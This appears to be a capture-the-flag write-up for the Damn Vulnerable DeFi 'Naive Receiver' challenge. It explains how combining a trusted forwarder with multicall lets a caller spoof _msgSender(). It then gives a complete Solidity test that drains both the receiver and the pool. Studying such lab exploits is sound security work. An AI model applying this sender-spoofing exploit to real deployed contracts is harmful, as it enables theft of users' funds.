You can check the challenge [here](https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/).

First we know that the pool implements meta-transactions by integrating a forwarder, this type of transaction gives the ability of signing transactions off-chain and using them after on-chain, forwarded by other contracts (implementing the EIP-712) which helps to reduce the number of transactions in the blockchain and to save gas. Furthermore, the pool also uses multicall, which allows making multiple function calls to the contract in a single transaction to save gas.

---

The forwarder appends the address of the signer at the end of the passed payload, which can be seen here:

```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        _checkRequest(request, signature);

        nonces[request.from]++;

        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;
        bytes memory payload = abi.encodePacked(request.data, request.from); // !! This is where the address of the sender is appended to the payload.
        uint256 forwardGas = request.gas;
        assembly {                                     
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) 
            gasLeft := gas()
        }

        if (gasLeft < request.gas / 63) {
            assembly {
                invalid()
            }
        }
    }
```

The pool then extracts that sender to work with as if it were the actual `msg.sender` :

```solidity
function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:])); // This is the address that the forwarder appends and the pool uses it as if it were the msg.sender
        } else {
            return super._msgSender();
        }
    }
```

By combining the forwarder that appends the sender at the end of the payload, and the multicall function that uses the data as it is, we can create a payload with the feeReceiver's address appended to the end of the calldata.

To drain the contract we need:

1. Call `withdraw(uint256 amount, address receiver)`, `amount`  being the pool’s balance and the `receiver` being the recovery account given in the challenge. But the catch is, the return of `_msgSender()` should be the `feeReceiver` , as he owns the tokens deposited in the pool at construction.
2. `_msgSender()`  can return two different values, one is the normal `msg.sender` given in that context, the other option is the address that the forwarder appends when making the call to the pool.
    
    ```solidity
    Line: 99 return address(bytes20(msg.data[msg.data.length - 20:]));
    ```
    
3. The address that the forwarder appends is the `from` field in the request data structure, which cannot be manipulated.
4. However, we can use `multicall(bytes[])` to pass a crafted payload that contains all the parameters to call `withdraw(uint256,address)` function, and add the address of the `feeReceiver` at the end of it.
    
    ```solidity
    Line: 96 if (msg.sender == trustedForwarder && msg.data.length >= 20)
    ```
    
    The condition above should be true for our attack to work, so our transaction will be processed by the forwarder.
    

The solution would be like the following:

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {

        // First we should empty the flashLoan contract (or the receiver)
        for(uint i = 0; i < 10; i++) { 
            pool.flashLoan(receiver, address(weth), 0, "");
        }

        bytes[] memory multicallArgument = new bytes[](1);

        // The attack payload contains the call to the withdraw function with the appropriate parameters.
        bytes memory attackPayload = abi.encodeWithSignature("withdraw(uint256,address)", weth.balanceOf(address(pool)), recovery);

        // Appending the feeReceiver (which is the deployer) address at the end of the payload                                            
        attackPayload = abi.encodePacked(attackPayload, abi.encode(deployer));

        multicallArgument[0] = attackPayload;

        bytes memory finalPayload = abi.encodeWithSignature("multicall(bytes[])", multicallArgument);

        // The data structure that the forwarder uses
        BasicForwarder.Request memory attackRequest;
        attackRequest.from = player;
        attackRequest.target = address(pool);
        attackRequest.value = 0;
        attackRequest.nonce = 0;
        attackRequest.data = finalPayload;
        attackRequest.gas = gasleft();
        attackRequest.deadline = block.timestamp + 1 days;

        bytes32 structhash = forwarder.getDataHash(attackRequest);
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                structhash
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        // All the above were steps to sign a transaction following the EIP-712 standard.

        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(attackRequest, signature); // Execute the forwarder with our payload.

        console.log(weth.balanceOf(address(pool))); // 0 - The Attack was successful
    }
```